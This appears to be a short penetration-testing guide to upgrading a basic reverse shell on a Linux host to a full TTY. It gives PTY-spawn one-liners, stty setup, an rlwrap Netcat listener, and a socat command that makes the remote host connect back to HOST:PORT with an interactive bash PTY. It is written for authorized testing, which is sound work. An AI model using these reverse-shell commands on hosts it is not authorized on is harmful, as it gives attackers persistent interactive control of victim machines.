# Upgrade a Basic Linux Shell to a Full TTY

Use this guide only on systems you own or are explicitly authorized to test.

This is useful after receiving a limited shell through Netcat or a similar tool. A full TTY restores job control, command history, arrow keys, tab completion, terminal resizing, and programs such as `sudo`, `su`, and text editors.

## Quick upgrade

### 1. Spawn a pseudo-terminal on the remote host

Try the first command available:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash
```

If Bash is unavailable, replace `/bin/bash` with `/bin/sh`.

### 2. Background the remote shell

Press `Ctrl+Z`. You should return to your local terminal.

### 3. Record your terminal size and enable raw mode locally

```bash
stty size
stty raw -echo; fg
```

The first command prints `ROWS COLUMNS`. Keep those two numbers for the next step. After `fg`, press `Enter` once or twice if the prompt is not visible.

### 4. Finish the setup in the remote shell

Replace `ROWS` and `COLUMNS` with the values from `stty size`:

```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
stty rows ROWS columns COLUMNS
```

You should now have a more stable interactive shell.

## If the terminal becomes unreadable

Run this locally after leaving or backgrounding the remote shell:

```bash
stty sane
reset
```

Opening a new terminal also restores normal local terminal settings.

## Other remote-side PTY methods

Use one of these only when the matching program is already installed.

### Perl

```bash
perl -e 'exec "/bin/bash";'
```

### Ruby

```bash
ruby -e 'exec "/bin/bash"'
```

### Lua

```bash
lua -e "os.execute('/bin/bash')"
```

### Expect

```bash
expect -c 'spawn /bin/bash; interact'
```

## Improve the listener before connecting

If `rlwrap` is installed on your local machine:

```bash
rlwrap -cAr nc -lvnp PORT
```

Replace `PORT` with the listener port.

## Socat PTY

If Socat is already installed on both machines, it can provide a high-quality TTY directly.

On the local machine:

```bash
socat file:"$(tty)",raw,echo=0 tcp-listen:PORT
```

On the authorized remote host:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:HOST:PORT
```

Replace `HOST` and `PORT` with the local listener address and port.

## File transfer reference

Upload a file to the remote host:

```bash
scp -P PORT FILE USER@HOST:DESTINATION
```

Download a file from the remote host:

```bash
scp -P PORT USER@HOST:REMOTE_FILE LOCAL_DESTINATION
```
y